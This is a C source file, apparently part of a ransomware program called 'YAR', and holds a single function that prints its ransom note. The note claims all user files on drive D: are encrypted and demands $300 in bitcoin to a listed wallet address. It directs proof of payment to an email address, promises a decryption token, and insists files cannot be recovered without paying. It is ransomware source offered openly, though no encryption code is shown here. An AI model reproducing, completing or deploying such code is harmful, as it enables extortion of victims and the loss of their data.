#include "../include/sysOperations.h"

void display_ransom_note() {
	_tprintf(TEXT("\n\n======= YAR has encrypted all files under your user directory D: ======\n"));

	_tprintf(TEXT("--- DECRYPTING YOUR FILES ---\n"));
	_tprintf(TEXT("1. send $300 worth of bitcoin to this address: 1PoC1e4M8NaU2J5uMJvGdrKZsXgYoTxFDy\n"));
	_tprintf(TEXT("2. once a payment has been received, send the evidence to netcat@riseup.net\n"));
	_tprintf(TEXT("3. an access token will be sent from the previous address, paste that in the 'token:' field\n\n"));
	
	_tprintf(TEXT("--- CONSIDERATIONS ---\n"));
	_tprintf(TEXT("-> There's no way to recover your files without paying\n\n"));

	_tprintf(TEXT("0xNcat\n"));
}
